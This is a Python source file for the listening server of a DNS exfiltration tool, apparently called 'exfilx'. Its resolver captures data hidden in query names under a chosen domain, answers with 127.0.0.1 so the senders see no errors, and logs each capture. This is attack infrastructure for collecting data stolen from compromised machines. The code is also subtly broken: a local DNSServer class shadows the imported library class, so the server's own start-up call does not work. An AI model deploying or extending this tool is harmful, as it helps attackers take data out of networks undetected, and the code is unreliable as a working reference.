import logging
import threading
import socket
from dnslib import DNSRecord, RR, QTYPE, A
from dnslib.server import DNSServer, DNSHandler, BaseResolver

from exfiltration.dns_exfil import DNSExfiltrator

logger = logging.getLogger('exfilx')

class ExfilResolver(BaseResolver):
    """DNS resolver that captures exfiltrated data from DNS queries"""

    def __init__(self, domain="exfil.local"):
        self.domain = domain
        self.exfiltrator = DNSExfiltrator(domain=domain)

    def resolve(self, request, handler):
        """Resolve DNS requests and extract exfiltrated data"""
        reply = request.reply()
        qname = str(request.q.qname)

        # Check if this is an exfiltration request (matches our domain)
        if qname.endswith(f"{self.domain}."):
            # Process the exfiltrated data
            self.exfiltrator.process_data(qname)

            # Always respond with a valid IP to avoid errors
            # Using 127.0.0.1 for all exfiltration requests
            answer = RR(
                rname=request.q.qname,
                rtype=QTYPE.A,
                rclass=request.q.qclass,
                ttl=60,
                rdata=A("127.0.0.1")
            )
            reply.add_answer(answer)

            logger.debug(f"Responded to exfiltration query: {qname}")
        else:
            # For non-exfiltration queries, respond with NXDOMAIN
            reply.header.rcode = 3  # NXDOMAIN

        return reply

class DNSServer:
    """DNS server for capturing exfiltrated data"""

    def __init__(self, port=53, domain="exfil.local"):
        self.port = port
        self.domain = domain
        self.server = None
        self.thread = None

    def start(self):
        """Start the DNS server in a separate thread"""
        try:
            resolver = ExfilResolver(domain=self.domain)
            self.server = DNSServer(resolver, port=self.port)

            self.thread = threading.Thread(target=self.server.start)
            self.thread.daemon = True
            self.thread.start()

            logger.info(f"DNS exfiltration server started on port {self.port}")
            logger.info(f"Listening for queries to *.{self.domain}")
            logger.info("Press Ctrl+C to stop the server")

            # Keep the main thread alive
            try:
                while self.thread.is_alive():
                    self.thread.join(1)
            except KeyboardInterrupt:
                self.stop()

        except socket.error as e:
            if e.errno == 13:  # Permission denied
                logger.error(f"Permission denied to bind to port {self.port}. Try running with sudo or use a port > 1024.")
            elif e.errno == 98:  # Address already in use
                logger.error(f"Port {self.port} is already in use. Try a different port.")
            else:
                logger.error(f"Socket error: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"Error starting DNS server: {str(e)}")
            raise

    def stop(self):
        """Stop the DNS server"""
        if self.server:
            logger.info("Stopping DNS server...")
            self.server.stop()
            logger.info("DNS server stopped")
